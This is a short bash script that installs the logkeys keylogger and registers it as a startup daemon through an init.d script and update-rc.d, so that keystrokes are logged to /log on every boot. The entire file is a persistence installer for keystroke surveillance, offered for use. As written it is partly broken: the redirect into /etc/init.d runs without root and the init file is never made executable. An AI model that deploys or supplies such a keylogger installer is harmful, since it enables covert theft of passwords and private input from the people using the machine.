#!/bin/bash
#this script installs a keylogger and makes it a startup daemon
#sudo apt-get install logkeys
sudo echo "logkeys -s -o /log" >/etc/init.d/keylogger
sudo update-rc.d keylogger defaults
sudo /etc/init.d/keylogger
